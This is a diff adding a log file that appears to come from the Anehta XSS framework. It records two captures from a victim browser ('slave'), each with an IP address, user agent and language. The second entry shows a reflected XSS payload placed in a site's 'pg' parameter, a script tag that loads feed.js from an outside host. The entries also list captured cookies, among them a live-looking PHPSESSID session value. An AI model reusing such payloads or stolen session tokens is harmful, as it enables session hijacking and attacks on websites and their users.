@@ -1,0 +1,28 @@
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+ Slave login at:  10/19/2008 03:36:39
+ Slave IP: 221.12.59.210
+ Slave User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)
+ Slave Lang: zh-cn
+ XSS got: 
+    [**** Watermark: FirstCatch:www.underwoodlandcompany.com|1224341218390 ****]
+    [**** Request URI: http://www.secwiki.com/anehta/test.html ****]
+    [**** Cookie: boomerang=x; anehtaWatermark=FirstCatch:www.underwoodlandcompany.com|1224341218390 ****]
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+ Slave login at:  10/19/2008 03:36:45
+ Slave IP: 221.12.59.210
+ Slave User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)
+ Slave Lang: zh-cn
+ XSS got: 
+    [**** Watermark: FirstCatch:www.underwoodlandcompany.com|1224341218390 ****]
+    [**** Request URI: http://www.underwoodlandcompany.com/?pg=asdf<script src='http://www.secwiki.com/anehta/feed.js'></script> ****]
+    [**** Cookie: PHPSESSID=h98t51bl5kj8nb1s59nerbmro7; anehtaWatermark=FirstCatch:www.underwoodlandcompany.com|1224341218390 ****]
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
